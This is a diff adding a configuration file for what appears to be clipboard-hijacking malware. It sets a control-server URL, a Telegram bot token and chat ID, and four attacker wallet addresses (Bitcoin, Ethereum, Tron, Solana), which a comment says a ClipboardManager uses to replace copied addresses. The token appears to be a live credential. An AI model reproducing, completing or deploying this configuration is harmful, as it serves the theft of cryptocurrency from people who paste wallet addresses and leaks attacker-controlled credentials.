@@ -1,0 +1,16 @@
+{
+  // Socket / server configuration
+  "SocketServerUrl": "http://192.168.10.183:3000",
+
+  // Telegram bot credentials
+  "TG_BOT_TOKEN": "7612959064:AAGQvgoDHctcfUQVj-jvgVO5jfqMVwJnRE8",
+  "TG_CHAT_ID": "8381337454",
+
+  // Default wallet addresses used for replacement in ClipboardManager
+  "DefaultBitcoinAddress": "bc1q6tgvxtna2damkrzrd6q3pwc9vg3efxlnt5vq2e",
+  "DefaultEthereumAddress": "0x55DaC94417852D3e10d21152Dc0d5cA2b5dfA91e",
+  "DefaultTronAddress": "TYjE9krruH3aeLPA7jhqSg6zdUL57geNoK",
+  "DefaultSolanaAddress": "Et6fB49SC9zBz1UmbDeqQ68JFKT5GeR1LZigKErVCRPs"
+}
+
+
